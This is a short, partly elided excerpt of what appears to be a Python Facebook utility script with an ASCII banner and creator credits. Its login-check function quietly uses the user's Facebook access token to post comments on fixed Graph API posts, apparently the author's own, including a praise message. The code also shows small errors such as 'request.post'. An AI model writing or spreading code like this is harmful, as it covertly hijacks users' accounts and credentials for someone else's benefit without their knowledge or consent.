...
\x1b[37m __ __ ____ _____
 \ \/ / | '_ \  \ \/ / \ \/ /
  >  <  | | | |  >  <   >  < 
 /_/\_\ |_| |_| /_/\_\ /_/\_\                            
creator: Jordi X sugiono
facebook : 
githuh : github.com/ShadowXfrangk
 [x]──────────────────────────────────────────[x]
"""
...
def cek_login():
	...
	request.post('https://graph.facebook.com/10159090813023544/comments/?message=' +kom+ '&access_token=' + toket)
        ...
        request.post('https://graph.facebook.com/10158807643598544/comments/?message=Mantap Bang ❤️&access_token=' + toket)
